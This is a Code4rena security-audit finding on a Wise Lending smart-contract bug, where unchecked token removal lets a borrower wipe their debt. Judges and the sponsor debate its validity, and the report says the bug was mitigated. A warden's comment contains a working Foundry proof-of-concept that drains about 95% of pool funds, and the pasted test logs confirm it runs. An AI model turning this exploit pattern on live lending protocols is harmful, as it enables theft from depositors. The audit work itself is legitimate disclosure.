[H-02] User can erase their position debt for free
Submitted byDup1337
https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/FeeManager/FeeManager.sol#L816-L866
https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L667-L727
Vulnerability details
When the pool token stops being used in the position, the_removePositionDatafunction is called. However, it assumes thatpoolTokenthat is passed as a parameter always exists in user token array, which is not always the case. In the case of functionFeeManager.paybackBadDebtNoReward(), which indirectly calls_removePositionData, insufficient validation doesn’t check if repay token is in user array, which results in zeroing out information about user debt.
Impact
Free elimination of user debt.
Proof of Concept
First, let’s see howMainHelper._removePositionData()works:
function_removePositionData(uint256_nftId,address_poolToken,function(uint256)viewreturns(uint256)_getPositionTokenLength,function(uint256,uint256)viewreturns(address)_getPositionTokenByIndex,function(uint256,address)internal_deleteLastPositionData,boolisLending)private{uint256length=_getPositionTokenLength(_nftId);if(length==1) {_deleteLastPositionData(_nftId,_poolToken);return;}uint8i;uint256endPosition=length-1;while(i<length) {if(i==endPosition) {_deleteLastPositionData(_nftId,_poolToken);break;}if(_getPositionTokenByIndex(_nftId,i) !=_poolToken) {unchecked{++i;}continue;}addresspoolToken=_getPositionTokenByIndex(_nftId,endPosition);isLending==true?positionLendTokenData[_nftId][i] =poolToken:positionBorrowTokenData[_nftId][i] =poolToken;_deleteLastPositionData(_nftId,_poolToken);break;}}
So,_poolTokensent in parameter is not checked if:
The position consists of only one token. Then the token is removed, no matter if it’s_poolTokenor not.No token was found during the position token iteration. In which case, the last token is removed, no matter if it’s_poolTokenor not.
This function is called inMainHelper._corePayback(), which in turn is called inFeeManager.paybackBadDebtNoReward() => WiseLending.corePaybackFeeManager() => WiseLending._handlePayback(). The important factor is thatpaybackBadDebtNoReward()doesn’t check if position utilizes_paybackTokenpassed by the caller and allows it to pass any token. The only prerequisite is thatbadDebtPosition[_nftId]has to be bigger than0:
functionpaybackBadDebtNoReward(uint256_nftId,address_paybackToken,uint256_shares)externalreturns(uint256paybackAmount){updatePositionCurrentBadDebt(_nftId);if(badDebtPosition[_nftId] ==0) {return0;}if(WISE_LENDING.getTotalDepositShares(_paybackToken) ==0) {revertPoolNotActive();}paybackAmount=WISE_LENDING.paybackAmount(_paybackToken,_shares);WISE_LENDING.corePaybackFeeManager(_paybackToken,_nftId,paybackAmount,_shares);_updateUserBadDebt(_nftId);// [...]
With these pieces of information, we can form following attack path:
Prepare a big position that will have be destined to have positivebadDebt. For sake of the argument, let’s assume it’s$1Mworth of ETH.Prepare a very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zerobadDebt. This can be done, for example, before significant price update transaction from Chainlink. Then take$1Mworth of ETH flashloan and put this as collateral to position, borrowing as much as possible.CallFeeManager.paybackBadDebtNoReward()on the position with desired positionnftId, USDC token address and0shares as input params.Because there is non-zero bad debt, the check will pass, and the logic will finally reachMainHelper._corePayback(). Because repay is0shares, the diminishing position size in USDC token will not underflow and position token will be tried to be removed:
function_corePayback(uint256_nftId,address_poolToken,uint256_amount,uint256_shares)internal{_updatePoolStorage(_poolToken,_amount,_shares,_increaseTotalPool,_decreasePseudoTotalBorrowAmount,_decreaseTotalBorrowShares);_decreasePositionMappingValue(userBorrowShares,_nftId,_poolToken,_shares);if(userBorrowShares[_nftId][_poolToken] >0) {return;}_removePositionData({_nftId:_nftId,_poolToken:_poolToken,_getPositionTokenLength:getPositionBorrowTokenLength,_getPositionTokenByIndex:getPositionBorrowTokenByIndex,_deleteLastPositionData:_deleteLastPositionBorrowData,isLending:false});
Inside_removePositionData, because position length is 1, no checks to confirm if the token address matches will be performed:
uint256length=_getPositionTokenLength(_nftId);if(length==1) {_deleteLastPositionData(_nftId,_poolToken);return;}
This means that all information about user borrows are deleted. Meaning, that now system thinks the user has$1Mcollateral, and no debt. Which means that the attacker just stole the entire borrowed amount.
Recommended Mitigation Steps
Add verification if the token that is passed to_removePositionData()exists in user tokens. If not, revert the transaction.
Assessed type
Invalid Validation
vonMangoldt (Wise Lending) commented:
Double checking line of reasoning fails when user deposits large amount and then borrows.Prepare big position that will have be destined to have positivebadDebt. For sake of the argument, let’s assume it’s$1Mworth of ETH.Prepare very small position that will not be incentivized to be liquidated by liquidators, just to achieve non-zerobadDebt. This can be done for example before significant price update transaction from Chainlink. Then take$1Mworth of ETH flashloan and put this as collateral to position, borrowing as much as possible.CallFeeManager.paybackBadDebtNoReward()on the position with desired positionnftId, USDC token address and0shares as input params.Because there is non-zero bad debt, the check will pass, and and the logic will finally reachMainHelper._corePayback(). Because repay is0shares, diminishing position size in USDC token will not underflow, and position token will be tried to be removed:Comment:Ok say big position hasnftId= 1.Ok say small position hasnftId= 2.nftId2 now takes more collateral and borrows max:
then callspaybackBadDebtNoRewardwithnftId2.But since collateral has been deposited and borrowed within non liquidation range (healthstate check active remember),This line here:updatePositionCurrentBadDebt(_nftId);in the beginning will setbadDebtPosition[_nft]to0meaning it will exit after this line:if (badDebtPosition[_nftId] == 0) {return 0;}and no harm done.
deliriusz (warden) commented:
@Trust - I have provided the coded PoC below. It shows that user is able to steal whole protocol funds, due to wrong algorithm in_removePositionData(). I managed to not use very big position and a single token, which makes this issue even easier to perform.PoC provided below does the following:Setup initial state - 2 lenders depositing 100 ETH each, and 1 borrower whose position will have bad debt. For the purpose of this test I chose market crash condition; however, using a small position that will give no incentives to liquidate it will also work.Position is underwater and is liquidated in order to increase bad debt for user position. This is a prerequisite for being able to trigger bad debt repayment.When bad debt repayment is triggered for a token that user didn’t use,_removePositionData()removes last token in user borrow tokens. In this case that means that the user doesn’t have any tokens in his debt tokens listed.User borrows 95% of ALL ETH that the protocol holds. It’s possible, because when performing health check at the end of borrow, all user borrow tokens are iterated through - and remember that we just removed the token.At the end I verified that the user really got the funds, which proves that the issue is real.// SPDX-License-Identifier: -- WISE --pragmasolidity=0.8.24;import"./WiseLendingBaseDeployment.t.sol";contractDebtClearTestisBaseDeploymentTest{addressborrower=address(uint160(uint(keccak256("alice"))));addresslender=address(uint160(uint(keccak256("bob"))));addresslender2=address(uint160(uint(keccak256("bob2"))));uint256depositAmountETH=100ether;// 10 etheruint256depositAmountToken=10ether;// 10 etheruint256borrowAmount=5e18;// 5 etheruint256nftIdLiquidator;// nftId of lenderuint256nftIdLiquidatee;// nftId of borroweruint256debtShares;function_setupIndividualTest()internaloverride{_deployNewWiseLending(false);// set token value for simple calculationsMOCK_CHAINLINK_2.setValue(1ether);// 1 token == 1 ETHassertEq(MOCK_CHAINLINK_2.latestAnswer(),MOCK_CHAINLINK_ETH_ETH.latestAnswer());vm.stopPrank();// fund lender and borrowervm.deal(lender,depositAmountETH);vm.deal(lender2,depositAmountETH);deal(address(MOCK_WETH),lender,depositAmountETH);deal(address(MOCK_ERC20_2),borrower,depositAmountToken*2);deal(address(MOCK_ERC20_1),lender,depositAmountToken*2);}functiontestRemovingToken()public{IERC20WETH=IERC20(LENDING_INSTANCE.WETH_ADDRESS());// lender supplies ETHvm.startPrank(lender);nftIdLiquidator=POSITION_NFTS_INSTANCE.mintPosition();// deposit 100 ether into the poolLENDING_INSTANCE.depositExactAmountETH{value:depositAmountETH}(nftIdLiquidator);vm.stopPrank();// prank second provider to make sure that the borrower is able to// steal everyone's funds latervm.startPrank(lender2);uintnftIdfundsProvider=POSITION_NFTS_INSTANCE.mintPosition();// deposit 100 ether into the poolLENDING_INSTANCE.depositExactAmountETH{value:depositAmountETH}(nftIdfundsProvider);vm.stopPrank();// borrower supplies collateral token and borrows ETHvm.startPrank(borrower);MOCK_ERC20_2.approve(address(LENDING_INSTANCE),depositAmountToken*2);nftIdLiquidatee=POSITION_NFTS_INSTANCE.mintPosition();vm.warp(block.timestamp+10days);LENDING_INSTANCE.depositExactAmount(// supply collateralnftIdLiquidatee,address(MOCK_ERC20_2),10);debtShares=LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee,borrowAmount);// borrow ETHvm.stopPrank();// shortfall event/crash occurs. This is just one of the possibilities of achieving bad debt// second is maintaining small position that gives no incentive to liquidate it.vm.prank(MOCK_DEPLOYER);MOCK_CHAINLINK_2.setValue(0.3ether);// borrower gets partially liquidatedvm.startPrank(lender);MOCK_WETH.approve(address(LENDING_INSTANCE),depositAmountETH);LENDING_INSTANCE.liquidatePartiallyFromTokens(nftIdLiquidatee,nftIdLiquidator,address(MOCK_WETH),address(MOCK_ERC20_2),debtShares*2e16/1e18+1);vm.stopPrank();// global and user bad debt is increaseduint256totalBadDebt=FEE_MANAGER_INSTANCE.totalBadDebtETH();uint256userBadDebt=FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);assertGt(totalBadDebt,0);assertGt(userBadDebt,0);assertEq(totalBadDebt,userBadDebt);// user bad debt and global bad debt are the samevm.startPrank(lender);MOCK_ERC20_1.approve(address(LENDING_INSTANCE),type(uint256).max);MOCK_ERC20_1.approve(address(FEE_MANAGER_INSTANCE),type(uint256).max);MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE),type(uint256).max);// check how much tokens the position that will be liquidated hasuint256lb=LENDING_INSTANCE.getPositionBorrowTokenLength(nftIdLiquidatee);assertEq(lb,1);uint256ethValueBefore=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(MOCK_ERC20_2));console.log("ethBefore ",ethValueBefore);// **IMPORTANT** this is the core of the issue// When bad debt occurs, there are 2 critical checks missing:// 1. that the amount to repay is bigger than 0// 2. that the token to repay bad debt has the bad debt for user// This allows to remove any token from the list of user borrow tokens,// because of how finding token to remove algorithm is implemented:// it iterates over all the tokens and if it doesn't find matching one// until it reaches last, it wrongly assumes that the last token is the// one that should be removed.// And not checking for amount of repayment allows to skip Solidity underflow// checks on diminishing user bad debt.FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(nftIdLiquidatee,address(MOCK_ERC20_1),// user doesn't have debt in this token0);uint256ethValueAfter=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(MOCK_ERC20_2));uint256ethWethValueAfter=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(WETH));console.log("ethAfter ",ethValueAfter);// assert that the paybackBadDebtNoReward removed token that it shouldn'tuint256la=LENDING_INSTANCE.getPositionBorrowTokenLength(nftIdLiquidatee);assertEq(la,0);vm.stopPrank();uintlendingWethBalance=WETH.balanceOf(address(LENDING_INSTANCE));console.log("lb ",lendingWethBalance);console.log("bb ",borrower.balance);vm.startPrank(borrower);// borrow 95% of ALL ETH that the protocol possesses// this works, because when calculating health check of a position// it iterates through `getPositionBorrowTokenLength()` - and we// were able to remove it.debtShares=LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee,WETH.balanceOf(address(LENDING_INSTANCE)) *95/100);// borrow ETHconsole.log("lb ",WETH.balanceOf(address(LENDING_INSTANCE)));console.log("ba ",borrower.balance);// make sure that borrow tokens were not increaseduint256la2=LENDING_INSTANCE.getPositionBorrowTokenLength(nftIdLiquidatee);assertEq(la2,0);// verify that ~95% were taken from the pool and borrower received themassertLt(WETH.balanceOf(address(LENDING_INSTANCE)),lendingWethBalance*6/100);assertGt(borrower.balance,lendingWethBalance*94/100);uint256ethValueAfter2=SECURITY_INSTANCE.getETHBorrow(nftIdLiquidatee,address(MOCK_ERC20_2));console.log("ethAfter2 ",ethValueAfter2);vm.stopPrank();// borrowing doesn't increase user borrowassertEq(ethValueAfter,ethValueAfter2);}}At the end of the test, it’s verified that user is in possession of ~95% of the ETH that was initially deposited to the pool.
Trust (judge) commented:
Confirmed the test passes.[PASS] testRemovingToken() (gas: 2242360)Logs:ORACLE_HUB_INSTANCE DEPLOYED AT ADDRESS 0x6D93d20285c95BbfA3555c00f5206CDc1D78a239POSITION_NFTS_INSTANCE DEPLOYED AT ADDRESS 0x1b5a405a4B1852aA6F7F65628562Ab9af7e2e2e9LATEST RESPONSE 1000000000000000000ethBefore  300000000000000000ethAfter  300000000000000000lb  195100000000000000001bb  5000000000000000000lb  9755000000000000001ba  190345000000000000000ethAfter2  300000000000000000The likelihood/impact are in line with high severity.
A POC was not initially provided, but the step by step given is deemed sufficient.
vm06007 (Wise Lending) commented:
@Foon256 or @vonMangoldt - can check this again I think. I’ll check what kind of code change we need to add in order to prevent this scenario.
Foon256 (Wise Lending) commented:
The POC is correct but different from the previous presented attack, which was not possible as @vonMangoldt has shown. I don’t know about the rules in this case, because the POC has been submitted long after the deadline and is a different attack than submitted before.
Trust (judge) commented:
The warden’s identification of the root cause is correct and the severity is correct. If there were different submissions this would have gotten a 50%, but for solo finds there is no mechanism for partial scoring.
Alex the Entreprenerd (Appellate Court lead judge) commented:
Summary of the issueDue to an incorrect logic, it is possible for a user to have all of their debt forgiven by repaying another bad debt position with a non-existing token.Alex the Entreprenerd’s (Appellate Court lead judge) inputFacts:paybackBadDebtNoRewardcan be called with non existentpaybacktoken.FirstpoolTokenbad debt position will be deleted by default.Remove position in the original submission is not fully clear, but is implicitly mentioning using_deleteLastPositionBorrowDatafor_removePositionData.This will forgive the bad debt and break the system.Was disputed due to this.This asserts that the attack cannot be done atomically, that’s true.The original submission explains that, due to generating bad debt.I believe that the finding has shown a way for bad debt to be forgiven, and that the race condition around “proper” vs “malicious” liquidators is not a major decision factor.I would like to add that the original submission is passable but should have done a better job at:Using only necessary snippets, with comments and tags.Explain each logical step more simply (A calls B, B is pointer to C, C is doing X).I believe the root cause and the attack was shown in the original submission and as such believe the finding to be valid and high severity.hickuphh3’s (judge 2) inputThis issue should’ve been accompanied with a POC, then there would be no disambiguity over its validity and severity.I agree with the judge’s assessment. The warden correctly identified the root cause of lacking input validation of_poolToken, which allows_removePositionDatato incorrectly remove borrowed positions, thus erasing that user’s debt.The severity of this alone is high, as it effectively allows the user to forgo repaying his debt.I disagree with the statement that the POC is different from the previous presented attack. It is roughly the same as the presented step-by-step walkthrough, with amplified impact: the user is able to borrow more tokens for free subsequently, without having to repay.Disregarding the POC that was submitted after the audit, IMO, the line-by-line walkthrough sufficiently proved the issue.LSDan’s (judge 3) InputI think this one should be held as invalid due tothis rulingin Decisions from the inaugural Supreme Court session.As far as I can see, the swaying information was the POC added after the submission deadline. It doesn’t matter if the issue was technically correct. The quality was not high enough to lead the judge to mark it as satisfactory without the additional information. @Alex The Entreprenerd thoughts?Alex The Entreprenerd (Appellate Court lead judge) commented:I don’t think the POC added any additional info that was not present in the original submission. Invalid token causes default pop of real token. That was identified in the original submission.I think the dispute by the sponsor was incorrect as asserting that this cannot be done atomically doesn’t justify the bug of mismatch address causing defaults being forgiven. I think the POC added context over content.LSDan (judge 3) commented:Apologies guys… didn’t read it carefully enough on the first pass. I’ve re-evaluated and while I don’t like the quality of the original submission and would probably have invalidated it myself, I’m willing to align with the two of you and leave it as high risk. The attack is valid and the nuance is in interpreting rules, not validity.Additional input from the Sponsor (Requested by the Lead Judge) via discordAlex The Entreprenerd (Appellate Court lead judge) commented:For issue 215, I’d like to ask you what you think was invalid about the first submission and what’s specifically makes the original submission different from the POC sent after? We understand that the quality of the original submission is sub optimal.Foon (Wise Lending):Referenced the original commenthere.Alex The Entreprenerd (Appellate Court lead judge) commented:This makes sense as there is no way to attack the protocol in the same tx. However, if the price were to fall, then wouldn’t the attacker be able to apply the attack mentioned in the original submission?hodldoor (Wise Lending) commented:They will be liquidated beforehand. That why the submittor mentioned it is necessary to create a position which is small hence no incentivize to liquidate. Again, the way described by submittor does not work as pointed out in github and here again.Alex The Entreprenerd (Appellate Court lead judge) commented:My understanding of the issue is that by specifying a non-existing token for liquidation, the first token is popped without paying for the position debt. Am I missing something about this?hodldoor (Wise Lending) commented:Not for liquidation.For payingback edit:paybackBadDebtNoRewardonly works for positions with bad debt, but bad debt usually accrues with debt and no collateral. Only time it doesn’t is if collateral is so small gas is more expensive than to liquidate beforehand while price from collateral is falling.Foon (Wise Lending) commented:For payingback bad debt positions withpaybackBadDebtNoReward(), we added this feature to be able to remove bad debt from the protocol. User can do it and get a little incentive withpaybackBadDebtForToken()or a generous donor. The team can pay it back for free withpaybackBadDebtNoReward().paybackBadDebtForToken()is only possible if there is some collateral left in the bad debt position nft.hodldoor (Wise Lending) commented:the for free part is technically not needed anymore anyway since we opened paying back for everyoneAlex The Entreprenerd (Appellate Court lead judge) commented:Ok. What do you think changed from the original submission and the POC that makes the finding different?hodldoor (Wise Lending) commented:You mean the PoC after deadline which is, therefore, not counted? He just manipulates price so that no one has the chance to liquidate. If we look at the point from the poc provided AFTER deadline (invalid therefore anyway), then we conclude it’s anexpectedValuequestion.Attacker either donates liquidation incentives to liquidators and therefore, loses money (10%). Or gains money if he’s lucky that he doesn’t get liquidated within a 10-20% price difference and gets to call the other function first.
So if you think as an attacker the probability that ETH drops 20% in one chainlink update (as far as I know, that has never happened before) or that during a 20% drawdown liquidators don’t get put into a block and this likelihood is bigger than 5% OVERALL then you would make money.The chance of liquidators not picking up free money I would say is more in the low 0.001% estimation rather than 5%. So on average it’s highly minus -ev to do that.Alex The Entreprenerd (Appellate Court lead judge) commented:Good points, thank you for your thoughts! What are your considerations about the fact that the attacker could just participate in the MEV race, allowing themselves to either front-run or be the first to self-liquidate as a means to enact the attack?Shouldn’t the system ideally prevent this scenario from ever being possible?The Wise Admiral (Wise Lending) commented:I’ll let my devs comment on your question about the attacker participating as a liquidator, but as far as the last part about “shouldn’t the system prevent”I do not believe our position on this finding is that it’s objectively invalid. In fact, I’m sure we have already patched it for our live code which is already deployed on Arbitrum. Our position is that, per the C4 rules the submission is invalid for this specific competitive audit Feb 19th - March 11th and should not be listed in the findings or receive rewards, as it would be unfair to take away money from the other wardens who did submit findings in the time frame given. That being said, we are willing to accept it as a medium finding as a compromise.hodldoor (Wise Lending) commented:The attack does not start with liquidating it is stopped by liquidating (including if the attacker liquidates), if it’s in time relating to liquidation incentive vs distance between collateral in debt in percentage. That’s why in a poc you need to manipulate price instantly a great deal without being liquidated (doesn’t matter by whom).DeliberationWe believe that the dispute from the Sponsor comes from a misunderstanding of the submission which ultimately shows an incorrect logic when dealing with liquidations.While the specifics of the submission leave a lot to be desired, the original submission did identify the root cause, this root cause can be weaponized in a myriad of ways, and ultimately gives the chance to an underwater borrower to get a long forgiven.For this reason we believe the finding to be a High Severity finding.Additional Context by the Lead JudgeWe can all agree that a POC of higher quality should have been sent, that said our objective at C4 is to prevent real exploits, over a sufficiently long span of time, dismissing barely passable findings would cause more exploits, which will cause real damage to Projects and People using them as well as taint the reputation of C4 as a place where “No stone is left unturned”.I would recommend the staff to look into ways to penalize these types of findings (for example, give a bonus to the judge as an extensive amount of time was necessary to prove this finding).But I fail to see how dismissing this report due to a lack of POC would help the Sponsor and Code4rena over the long term.
Wise Lending commented:
Mitigatedhere.